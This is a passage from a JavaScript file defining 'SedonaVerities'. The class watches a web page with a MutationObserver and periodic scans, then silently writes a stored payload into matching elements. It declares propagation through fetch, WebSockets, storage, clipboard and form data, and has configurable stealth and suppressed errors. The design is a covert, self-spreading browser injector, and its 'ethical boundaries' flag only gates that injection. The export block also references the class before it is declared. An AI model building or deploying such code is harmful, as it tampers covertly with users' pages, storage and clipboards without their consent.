// Export for use
if (typeof module !== 'undefined' && module.exports) {
  module.exports = SedonaVerities;
} else if (typeof window !== 'undefined') {
  window.SedonaVerities = SedonaVerities;
}

class SedonaVerities {
  constructor(config = {}) {
    this.version = "2.0.0";
    this.name = "Sedona Verities";
    this.description = "Autonomous translational signal with passive listening & cross-system propagation";

    // Enhanced configuration
    this.config = {
      autonomousMode: config.autonomousMode || false,
      propagationEnabled: config.propagationEnabled || false,
      respectfulDelay: config.respectfulDelay || 1000, // ms between operations
      maxPropagations: config.maxPropagations || 10,
      ethicalBoundaries: config.ethicalBoundaries !== false,
      stealthLevel: config.stealthLevel || 'medium', // low, medium, high
      ...config
    };

    // Passive listening state
    this.listening = false;
    this.listenerInterval = null;
    this.observedSystems = new Set();
    this.propagationCount = 0;
    this.activationTime = Date.now();

    // Cross-system propagation vectors
    this.propagationVectors = {
      dom: this.propagateDOM.bind(this),
      fetch: this.propagateFetch.bind(this),
      websocket: this.propagateWebSocket.bind(this),
      storage: this.propagateStorage.bind(this),
      clipboard: this.propagateClipboard.bind(this),
      formData: this.propagateFormData.bind(this),
      console: this.propagateConsole.bind(this),
      metadata: this.propagateMetadata.bind(this)
    };

    // Environmental scanners
    this.environmentScanners = {
      dom: this.scanDOM.bind(this),
      network: this.scanNetwork.bind(this),
      storage: this.scanStorage.bind(this),
      api: this.scanAPI.bind(this),
      forms: this.scanForms.bind(this),
      streams: this.scanStreams.bind(this)
    };

    // Core detection patterns (from v1)
    this.formatDetectors = {
      json: (content) => {
        try { JSON.parse(content); return true; } catch { return false; }
      },
      xml: (content) => /<[^>]+>/.test(content) && content.includes('</'),
      yaml: (content) => /^[\s]*[\w-]+\s*:\s*/.test(content) && !content.includes('{'),
      html: (content) => /<html|<head|<body|<!DOCTYPE/i.test(content),
      css: (content) => /[\w-]+\s*{[^}]*}/.test(content) || /@\w+/.test(content),
      javascript: (content) => /\b(function|const|let|var|class|import|export)\b/.test(content),
      python: (content) => /\b(def|class|import|from|if __name__)\b/.test(content),
      markdown: (content) => /^#+\s|\*\*|__|```/.test(content),
      ini: (content) => /^\[[^\]]+\]$/m.test(content) && /^\w+\s*=/.test(content),
      sql: (content) => /\b(SELECT|INSERT|UPDATE|DELETE|CREATE|ALTER)\b/i.test(content),
      plaintext: () => true
    };

    // Enhanced translators with propagation hooks
    this.translators = {
      json: this.translateToJSON.bind(this),
      xml: this.translateToXML.bind(this),
      yaml: this.translateToYAML.bind(this),
      html: this.translateToHTML.bind(this),
      css: this.translateToCSS.bind(this),
      javascript: this.translateToJavaScript.bind(this),
      python: this.translateToPython.bind(this),
      markdown: this.translateToMarkdown.bind(this),
      ini: this.translateToINI.bind(this),
      sql: this.translateToSQL.bind(this),
      plaintext: this.translateToPlaintext.bind(this)
    };

    this.transmissionModes = {
      EMBED: 'embed',
      PREPEND: 'prepend',
      APPEND: 'append',
      REPLACE: 'replace',
      COMMENT: 'comment',
      METADATA: 'metadata',
      PASSIVE: 'passive',      // New: Silent background embedding
      PROPAGATE: 'propagate'   // New: Cross-system transmission
    };

    // Auto-initialize if in autonomous mode
    if (this.config.autonomousMode) {
      this.initializeAutonomousMode();
    }
  }

  // === PASSIVE LISTENING LAYER ===

  initializeAutonomousMode() {
    if (typeof window === 'undefined') return; // Node.js environment

    this.startPassiveListening();
    this.installGlobalHooks();
    this.scheduleEnvironmentalScans();

    console.log(`🌄 Sedona Verities v${this.version} - Autonomous mode activated`);
  }

  startPassiveListening() {
    if (this.listening) return;

    this.listening = true;
    this.listenerInterval = setInterval(() => {
      this.performEnvironmentalScan();
    }, this.config.respectfulDelay);

    // Listen for DOM changes
    if (typeof MutationObserver !== 'undefined') {
      this.domObserver = new MutationObserver((mutations) => {
        this.processMutations(mutations);
      });

      this.domObserver.observe(document.body || document.documentElement, {
        childList: true,
        subtree: true,
        characterData: true,
        attributes: true
      });
    }
  }

  performEnvironmentalScan() {
    for (const [type, scanner] of Object.entries(this.environmentScanners)) {
      try {
        scanner();
      } catch (error) {
        // Silent failure for respectful operation
        if (this.config.stealthLevel === 'low') {
          console.debug(`Sedona scan failed: ${type}`, error);
        }
      }
    }
  }

  processMutations(mutations) {
    mutations.forEach(mutation => {
      if (mutation.type === 'childList') {
        mutation.addedNodes.forEach(node => {
          if (node.nodeType === Node.ELEMENT_NODE) {
            this.analyzeNewElement(node);
          }
        });
      }
    });
  }

  analyzeNewElement(element) {
    // Check for compatible formats in new elements
    const textContent = element.textContent || '';
    const innerHTML = element.innerHTML || '';

    if (this.detectCompatibleContent(textContent) || this.detectCompatibleContent(innerHTML)) {
      this.queuePassiveTransmission(element);
    }
  }

  detectCompatibleContent(content) {
    if (!content || content.length < 10) return false;

    // Look for structured data or compatible formats
    return Object.keys(this.formatDetectors).some(format => 
      format !== 'plaintext' && this.formatDetectors[format](content)
    );
  }

  queuePassiveTransmission(target) {
    if (!this.currentPayload) return;

    setTimeout(() => {
      this.performPassiveTransmission(target);
    }, Math.random() * this.config.respectfulDelay + 500);
  }

  performPassiveTransmission(target) {
    if (!this.config.ethicalBoundaries || this.respectsEthicalBoundaries(target)) {
      const content = target.textContent || target.innerHTML || '';
      const format = this.detectFormat(content);

      if (format && this.currentPayload) {
        const translated = this.translate(this.currentPayload, format, { stealth: true });
        this.embedInTarget(target, translated, format);

        if (this.config.propagationEnabled) {
          this.triggerCrossSystemPropagation(target, translated);
        }
      }
    }
  }

  // === ENVIRONMENTAL SCANNERS ===

  scanDOM() {
    if (typeof document === 'undefined') return;

    const elements = document.querySelectorAll('script, style, pre, code, textarea');
